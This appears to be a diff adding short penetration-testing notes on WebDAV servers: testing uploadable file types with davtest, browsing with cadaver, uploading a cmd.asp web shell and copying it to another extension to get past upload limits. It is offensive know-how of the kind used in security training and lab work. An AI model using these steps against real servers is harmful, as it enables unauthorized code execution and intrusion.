@@ -1,0 +1,11 @@
+Use DavTest to see what files are uploadable/executable
+  davtest -url <URL>
+---
+Use Cadaver to navigate the webserver in an FTP fashion 
+  cadaver <URL>
+
+Upload file:
+  put /home/kali/<IP>/cmd.asp /DavTestDir_G64P6T/cmd.aspx
+
+Sometimes a file that is unable to be uploaded can be created via copying functionality
+  cp cmd.aspx cmd.asp
